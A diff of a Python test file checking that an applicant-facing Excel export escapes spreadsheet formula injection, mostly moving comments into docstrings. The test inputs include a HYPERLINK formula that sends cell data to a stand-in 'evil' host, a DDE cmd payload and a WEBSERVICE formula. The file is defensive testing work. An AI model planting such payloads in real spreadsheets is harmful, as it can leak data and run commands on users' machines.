@@ -56,8 +56,14 @@ def test_safe_passes_through_non_strings() -> None:
     assert xlsx._safe(0) == 0
 
 
-# build_auskunft_workbook is the most exposed sink. Public applicants feed it.
 def test_auskunft_escapes_applicant_name_and_json_data() -> None:
+    """Escape the applicant name and the JSON data in the export workbook.
+
+    ``build_auskunft_workbook`` is the most exposed sink, because public applicants feed it.
+    Row 1 is the header and row 2 is the first data row. ``json.dumps`` returns a string
+    that starts with ``{``, which is harmless: the mySelect value stays inside the JSON and
+    Excel does not evaluate it. No cell may persist as an active formula.
+    """
     payload_name = '=HYPERLINK("http://evil/?"&A1,"click")'
     apps = [
         {
@@ -76,23 +82,20 @@ def test_auskunft_escapes_applicant_name_and_json_data() -> None:
         principal=None,
     )
     ws = _load(data)["Anträge"]
-    # Row 2 is the first data row. Row 1 is the header.
     type_cell = ws.cell(row=2, column=2).value
     name_cell = ws.cell(row=2, column=5).value
     json_cell = ws.cell(row=2, column=6).value
     assert name_cell == "'" + payload_name
     assert type_cell.startswith("'=WEBSERVICE")
-    # json.dumps returns a string that starts with {, which is harmless. The mySelect
-    # value stays inside the JSON and Excel does not evaluate it.
     assert json_cell.startswith("{")
     assert "=1+2" in json_cell
-    # No cell may persist as an active formula.
     for col in range(1, 7):
         val = ws.cell(row=2, column=col).value
         assert not (isinstance(val, str) and val[:1] in xlsx._FORMULA_PREFIXES)
 
 
 def test_auskunft_escapes_account_principal_fields() -> None:
+    """Escape the account fields of the principal; the e-mail of the request sits in row 2."""
     data = xlsx.build_auskunft_workbook(
         email="=cmd|'/c calc'!A1",
         applications=[],
@@ -100,7 +103,6 @@ def test_auskunft_escapes_account_principal_fields() -> None:
         principal={"sub": "=1+1", "email": "+x", "displayName": "@y", "active": True},
     )
     ws = _load(data)["Konto"]
-    # The email of the request sits in row 2.
     assert ws.cell(row=2, column=2).value.startswith("'=cmd")
     assert ws.cell(row=3, column=2).value == "'=1+1"
     assert ws.cell(row=4, column=2).value == "'+x"
